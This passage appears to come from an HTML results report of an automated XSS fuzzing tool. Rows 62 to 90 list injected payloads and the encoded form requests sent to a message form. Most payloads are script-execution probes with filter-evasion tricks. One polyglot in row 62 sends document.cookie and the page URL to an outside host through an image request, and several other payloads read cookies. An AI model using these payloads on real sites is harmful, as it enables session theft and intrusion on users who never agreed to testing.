+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=javascript%3A%2F%2A--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D%27%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B%2A%2F%5B%5D%2F%2Balert%281%29%2F%2F%27&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=javascript%3A%2F%2A--%3E%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E%3C%2Fxmp%3E%3Csvg%2Fonload%3D%27%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B%2A%2F%5B%5D%2F%2Balert%281%29%2F%2F%27&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>62</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_12_76.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>javascript://&#39;/&lt;/title>&lt;/style>&lt;/textarea>&lt;/script>-->&lt;p&quot; %0D %0A onclick=alert(123)//>*/alert()/*&lt;img src=x onerror=alert(456)/>&lt;svg/onload=prompt(789)/>;&#39;&quot;// :;fn();%0a%0d\n\r\t{{12*12+&#39;Audi RS5&#39;.substr(0,4)}}XXX&lt;script>alert(&#39;XSS&#39;)&lt;img src=x onerror=&#39;(function s(){var i=new Image();i.src=&#39;http://bl4de.tech/bxss.php?c=&#39;+document.cookie+&#39;;&#39;+encodeURIComponent(location.href);document.body.append(i)})()&#39;/>#jaVasCript:/*-/*`/*\\`/*&#39;/*\&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!>\\x3csVg/&lt;sVg/oNloAd=alert()//>\\x3e</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=javascript%3A%2F%2F%27%2F%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E--%3E%3Cp%22+%250D+%250A+onclick%3Dalert%28123%29%2F%2F%3E%2A%2Falert%28%29%2F%2A%3Cimg+src%3Dx+onerror%3Dalert%28456%29%2F%3E%3Csvg%2Fonload%3Dprompt%28789%29%2F%3E%3B%27%22%2F%2F+%3A%3Bfn%28%29%3B%250a%250d%5Cn%5Cr%5Ct%7B%7B12%2A12%2B%27Audi+RS5%27.substr%280%2C4%29%7D%7DXXX%3Cscript%3Ealert%28%27XSS%27%29%3Cimg+src%3Dx+onerror%3D%27%28function+s%28%29%7Bvar+i%3Dnew+Image%28%29%3Bi.src%3D%27http%3A%2F%2Fbl4de.tech%2Fbxss.php%3Fc%3D%27%2Bdocument.cookie%2B%27%3B%27%2BencodeURIComponent%28location.href%29%3Bdocument.body.append%28i%29%7D%29%28%29%27%2F%3E%23jaVasCript%3A%2F%2A-%2F%2A%60%2F%2A%5C%5C%60%2F%2A%27%2F%2A%5C%22%2F%2A%2A%2F%28%2F%2A+%2A%2FoNcliCk%3Dalert%28%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5C%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28%29%2F%2F%3E%5C%5Cx3e&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=javascript%3A%2F%2F%27%2F%3C%2Ftitle%3E%3C%2Fstyle%3E%3C%2Ftextarea%3E%3C%2Fscript%3E--%3E%3Cp%22+%250D+%250A+onclick%3Dalert%28123%29%2F%2F%3E%2A%2Falert%28%29%2F%2A%3Cimg+src%3Dx+onerror%3Dalert%28456%29%2F%3E%3Csvg%2Fonload%3Dprompt%28789%29%2F%3E%3B%27%22%2F%2F+%3A%3Bfn%28%29%3B%250a%250d%5Cn%5Cr%5Ct%7B%7B12%2A12%2B%27Audi+RS5%27.substr%280%2C4%29%7D%7DXXX%3Cscript%3Ealert%28%27XSS%27%29%3Cimg+src%3Dx+onerror%3D%27%28function+s%28%29%7Bvar+i%3Dnew+Image%28%29%3Bi.src%3D%27http%3A%2F%2Fbl4de.tech%2Fbxss.php%3Fc%3D%27%2Bdocument.cookie%2B%27%3B%27%2BencodeURIComponent%28location.href%29%3Bdocument.body.append%28i%29%7D%29%28%29%27%2F%3E%23jaVasCript%3A%2F%2A-%2F%2A%60%2F%2A%5C%5C%60%2F%2A%27%2F%2A%5C%22%2F%2A%2A%2F%28%2F%2A+%2A%2FoNcliCk%3Dalert%28%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5C%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%28%29%2F%2F%3E%5C%5Cx3e&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>63</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_13_310.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg onload=alert(document.domain)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Csvg+onload%3Dalert%28document.domain%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Csvg+onload%3Dalert%28document.domain%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>64</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_13_439.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>xss&quot;>&lt;!-->&lt;svg/onload=alert(document.domain)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=xss%22%3E%3C%21--%3E%3Csvg%2Fonload%3Dalert%28document.domain%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=xss%22%3E%3C%21--%3E%3Csvg%2Fonload%3Dalert%28document.domain%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>65</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_14_97.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerrora=confirm() onerror=confirm(1)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%3E%3Cimg+src%3Dx+onerrora%3Dconfirm%28%29+onerror%3Dconfirm%281%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%3E%3Cimg+src%3Dx+onerrora%3Dconfirm%28%29+onerror%3Dconfirm%281%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>66</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_14_152.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;\&quot;>&quot; + &quot;&lt;img src=x onerror=prompt(&#39;XSS&#39;)>&quot; + &quot;\&quot;&quot;</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%5C%22%3E%22+%2B+%22%3Cimg+src%3Dx+onerror%3Dprompt%28%27XSS%27%29%3E%22+%2B+%22%5C%22%22&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%5C%22%3E%22+%2B+%22%3Cimg+src%3Dx+onerror%3Dprompt%28%27XSS%27%29%3E%22+%2B+%22%5C%22%22&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>67</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_14_184.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;body/onload=&quot;{x:onerror=alert};x&quot;</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%3E%3Cbody%2Fonload%3D%22%7Bx%3Aonerror%3Dalert%7D%3Bx%22&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%3E%3Cbody%2Fonload%3D%22%7Bx%3Aonerror%3Dalert%7D%3Bx%22&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>68</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_14_852.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;&#39;>&lt;img src=q onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%27%3E%3Cimg+src%3Dq+onerror%3Dalert%281%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%27%3E%3Cimg+src%3Dq+onerror%3Dalert%281%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>69</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_14_911.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>}}}&lt;/script>&lt;script>alert(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%7D%7D%7D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%7D%7D%7D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>70</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_15_488.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;IFRAME SRC=&quot;javascript:alert(document.cookie);&quot;>&lt;/iframe>&#39;</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3CIFRAME+SRC%3D%22javascript%3Aalert%28document.cookie%29%3B%22%3E%3C%2Fiframe%3E%27&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3CIFRAME+SRC%3D%22javascript%3Aalert%28document.cookie%29%3B%22%3E%3C%2Fiframe%3E%27&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>71</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_15_511.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;details open id=&quot;&#39; &amp;quot;&#39;&quot;ontoggle=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cdetails+open+id%3D%22%27+%26quot%3B%27%22ontoggle%3Dalert%281%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cdetails+open+id%3D%22%27+%26quot%3B%27%22ontoggle%3Dalert%281%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>72</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_15_551.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;&lt;script>alert(0)&lt;/script>&quot;@gmail.com</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%3Cscript%3Ealert%280%29%3C%2Fscript%3E%22%40gmail.com&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%3Cscript%3Ealert%280%29%3C%2Fscript%3E%22%40gmail.com&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>73</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_15_577.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>test+(&lt;script>alert(0)&lt;/script>)@gmail.com</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=test%2B%28%3Cscript%3Ealert%280%29%3C%2Fscript%3E%29%40gmail.com&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=test%2B%28%3Cscript%3Ealert%280%29%3C%2Fscript%3E%29%40gmail.com&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>74</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_15_689.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>test@example(&lt;script>alert(0)&lt;/script>).com</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=test%40example%28%3Cscript%3Ealert%280%29%3C%2Fscript%3E%29.com&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=test%40example%28%3Cscript%3Ealert%280%29%3C%2Fscript%3E%29.com&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>75</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_16_307.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>#&quot;>&lt;img src=x onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%23%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3B%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%23%22%3E%3Cimg+src%3Dx+onerror%3Dprompt%28document.domain%29%3B%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>76</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_16_331.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>1&#39;)&quot;&lt;!-->&lt;Svg OnLoad=(confirm)(1)&lt;!--</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=1%27%29%22%3C%21--%3E%3CSvg+OnLoad%3D%28confirm%29%281%29%3C%21--&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=1%27%29%22%3C%21--%3E%3CSvg+OnLoad%3D%28confirm%29%281%29%3C%21--&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>77</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_16_321.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>#&lt;script>prompt(document.domain)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%23%3Cscript%3Eprompt%28document.domain%29%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%23%3Cscript%3Eprompt%28document.domain%29%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>78</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_16_416.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>-->&quot;&quot;/>&lt;/script>&lt;deTailS open x=&quot;>&quot; ontoggle=(co\u006efirm)``></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=--%3E%22%22%2F%3E%3C%2Fscript%3E%3CdeTailS+open+x%3D%22%3E%22+ontoggle%3D%28co%5Cu006efirm%29%60%60%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=--%3E%22%22%2F%3E%3C%2Fscript%3E%3CdeTailS+open+x%3D%22%3E%22+ontoggle%3D%28co%5Cu006efirm%29%60%60%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>79</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_16_449.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>prompt(document.domain)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cscript%3Eprompt%28document.domain%29%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cscript%3Eprompt%28document.domain%29%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>80</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_17_66.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>xyz&#39;;&quot;/>&lt;/textarea>&lt;Img Src=OnXSS OnError=prompt(document.cookie)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=xyz%27%3B%22%2F%3E%3C%2Ftextarea%3E%3CImg+Src%3DOnXSS+OnError%3Dprompt%28document.cookie%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=xyz%27%3B%22%2F%3E%3C%2Ftextarea%3E%3CImg+Src%3DOnXSS+OnError%3Dprompt%28document.cookie%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>81</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_17_85.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svgonload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Csvg%0Conload%0C%3D%0Calert%281%29%0C%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Csvg%0Conload%0C%3D%0Calert%281%29%0C%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>82</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_17_130.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>onerror=alert;throw 1337&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cscript%3Eonerror%3Dalert%3Bthrow+1337%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cscript%3Eonerror%3Dalert%3Bthrow+1337%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>83</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_17_229.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src=&#39;1&#39;/onerror=alert(0)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%3D%271%27%2Fonerror%3Dalert%280%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%3D%271%27%2Fonerror%3Dalert%280%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>84</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_17_228.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;svg/onload=confirm(1)>&quot;@x.y</td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%22%3E%3Csvg%2Fonload%3Dconfirm%281%29%3E%22%40x.y&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%22%3E%3Csvg%2Fonload%3Dconfirm%281%29%3E%22%40x.y&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>85</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_17_278.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img/src/onerror=alert(`ibro`)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%2Fonerror%3Dalert%28%60ibro%60%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3Cimg%2Fsrc%2Fonerror%3Dalert%28%60ibro%60%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>86</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_17_915.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>#&lt;img/src/onerror=alert(`ibro`)></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%23%3Cimg%2Fsrc%2Fonerror%3Dalert%28%60ibro%60%29%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%23%3Cimg%2Fsrc%2Fonerror%3Dalert%28%60ibro%60%29%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>87</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_17_908.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>>&quot;&#39;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3E%22%27%3E%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3E%22%27%3E%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>88</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_18_9.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>>&#39;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3E%27%3E%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3E%27%3E%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>89</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_18_122.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>>&#39;&quot;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%3E%27%22%3E%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%3E%27%22%3E%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>90</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_36_18_835.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&amp; apos;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='name=anonymous%2Buser&amp;text=%26+apos%3B%3E%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&amp;submit=add%2Bmessage'>name=anonymous%2Buser&amp;text=%26+apos%3B%3E%3Cscript%3Ealert%282%29%3B%3C%2Fscript%3E&amp;submit=add%2Bmessage</a></td>
+                </tr>
+            </tbody>
+                    </table>
+                    <div id='modal' class='modal'>
+                        <span class='close'>&times;</span>
+                        <img class='modal-content' id='modal-image'>
+                        <div id='caption'></div>
+                    </div>
+                </body>
+                </html>
+            
